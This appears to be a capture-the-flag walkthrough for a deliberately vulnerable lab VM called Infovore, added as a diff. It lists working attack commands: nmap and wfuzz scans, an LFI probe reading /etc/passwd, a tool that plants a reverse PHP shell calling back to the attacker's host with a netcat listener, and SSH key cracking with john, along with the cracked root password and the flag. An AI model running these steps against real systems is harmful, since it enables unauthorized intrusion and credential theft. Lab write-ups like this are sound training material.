@@ -1,0 +1,27 @@
+Infovore Walktrough 
+ip tergantung vm
+
+1. begin, i scan with nmap
+nmap -sC -sV -sS 192.168.88.192
+
+2. and port open is 80, i check in browser and nothing happend
+3. and i try scanning website with dirb
+dirb http://192.168.88.192/
+4. i check info.php is phpinfo function and i check index.php not happend, sad :( but i try using wuffz to check, what the website is vulnebarility LFI
+wfuzz -c -w /opt/wordlist/dirb/directory-list-2–3mediumt.txt -hw 382 -u http://192.168.88.192/index.php?FUZZ=/etc/passwd
+5. and yesss :) i get parameter is filename yeahh
+6. and i don't know what i do after we got lfi and php info, i search google and maybe is lfi php info to rce yeahhh 
+7. i use tools github https://github.com/roughiz/lfito_rce 
+python lfito_rce/lfito_rce.py  -l "http://192.168.88.192/index.php?filename=" --lhost 192.168.88.235 --lport 9001  -t 12  -i "http://192.168.88.192/info.php"
+Got it! Reverse php Shell created in /tmp/vKSWMSCNyAVA.php
+
+8. yeahh i got shell with nc -lvnp 9001 and i check browser with url http://192.168.88.192/index.php?filename=/tmp/vKSWMSCNyAVA.php
+9. and yeah i don't know what i do after this? i got stuck but i never give up i search file hidden with command ls -la and there is 1 suspicious file that is oldkeys.tgz i copy this file to /var/www/html and i get file with wget http://192.168.88.192/oldkeys.tgz 
+10. i extract it with tar -xf oldkeys.tgz and i got publik key root i use  john the ripper
+11. i use command ssh2john root > hashforjohn.txt && john --wordlist=rockyou.txt hash.txt
+
+choclate93       (root)     
+
+
+12. yeahhhh i got password root and i got flag in folder root the flag isss
+FLAG{Congrats_on_owning_phpinfo_hope_you_enjoyed_it}	
